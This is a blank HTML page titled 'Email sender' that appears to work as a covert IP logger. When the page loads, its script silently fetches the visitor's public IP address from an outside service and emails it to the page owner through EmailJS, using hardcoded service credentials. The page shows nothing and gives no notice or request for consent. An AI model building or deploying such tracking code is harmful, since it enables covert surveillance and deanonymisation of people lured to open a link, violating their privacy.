<!DOCTYPE html>
<html dir="rtl" lang="ar">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0;
    maximum-scale=1.0;"
    />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Email sender</title>
  </head>

  <body>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init("user_MF6O9xXb4AoxZRYkgc6OK");
      })();
      var templateParams = {
        name: "James",
        notes: "Check this out!",
      };
      fetch("https://api.ipify.org/?format=json")
        .then((response) => response.json())
        .then((data) => {
          // data contains the client's IP address
          console.log(data.ip);
          emailjs
            .send(
              "service_ar3kq0f",

              "template_1m5xrcm",
              {
                name: data.ip,
                notes: "ipAddress",
              }
            )
            .then(
              function (response) {
                console.log("SUCCESS!", response.status, response.text);
              },
              function (err) {
                console.log("FAILED...", err);
              }
            );
        })
        .catch((error) => {
          console.error(error);
          emailjs
            .send(
              "service_ar3kq0f",

              "template_1m5xrcm",
              {
                name: "error get ip address",
                notes: "ipAddress",
              }
            )
            .then(
              function (response) {
                console.log("SUCCESS!", response.status, response.text);
              },
              function (err) {
                console.log("FAILED...", err);
              }
            );
        });
    </script>
  </body>
</html>
